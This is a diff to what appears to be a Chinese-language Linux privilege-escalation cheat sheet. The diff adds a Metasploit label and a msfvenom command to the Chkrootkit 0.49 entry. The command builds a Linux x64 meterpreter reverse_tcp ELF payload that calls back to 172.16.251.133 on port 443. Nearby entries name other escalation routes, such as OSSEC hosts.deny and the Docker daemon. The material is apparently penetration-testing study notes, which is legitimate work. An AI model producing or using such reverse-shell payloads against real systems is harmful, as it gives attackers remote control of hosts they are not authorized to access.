@@ -103,7 +103,13 @@ OSSEC 2.8 - 'hosts.deny'  提权
 Docker Daemon 	提权
 
 
-使用Chkrootkit 0.49  提权
+MSF 使用Chkrootkit 0.49  提权
+
+```bash
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.251.133 LPORT=443 -a x64 --platform linux -f elf > payload.elf 
+
+```
 
 ![linux提权](../images/msfchk.png)
 
